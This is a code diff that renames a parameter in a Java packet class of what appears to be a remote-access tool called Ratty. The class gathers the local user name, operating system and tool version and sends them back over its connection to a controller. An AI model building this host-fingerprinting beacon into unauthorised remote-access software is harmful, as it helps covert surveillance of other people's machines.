@@ -22,41 +22,41 @@ public final class InformationPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void sendRequest(final ActiveConnection client) {
+	protected void sendRequest(final ActiveConnection connection) {
 		//...
 	}
 	
 	@Override
-	protected void sendData(final ActiveConnection client) {
-		client.writeUTF(name);
-		client.writeUTF(os);
-		client.writeUTF(version);
+	protected void sendData(final ActiveConnection connection) {
+		connection.writeUTF(name);
+		connection.writeUTF(os);
+		connection.writeUTF(version);
 	}
 	
 	@Override
-	protected void receiveRequest(final ActiveConnection client) {
+	protected void receiveRequest(final ActiveConnection connection) {
 		//...
 	}
 	
 	@Override
-	protected void receiveData(final ActiveConnection client) {
-		name = client.readUTF();
-		os = client.readUTF();
-		version = client.readUTF();
+	protected void receiveData(final ActiveConnection connection) {
+		name = connection.readUTF();
+		os = connection.readUTF();
+		version = connection.readUTF();
 	}
 	
 	@Override
-	protected void executeRequest(final ActiveConnection client) {
+	protected void executeRequest(final ActiveConnection connection) {
 		type = DATA;
 		name = System.getProperty("user.name");
 		os = System.getProperty("os.name");
 		version = Ratty.VERSION;
 		
-		client.addPacket(this);
+		connection.addPacket(this);
 	}
 	
 	@Override
-	protected void executeData(final ActiveConnection client) {
+	protected void executeData(final ActiveConnection connection) {
 		//...
 	}
 	
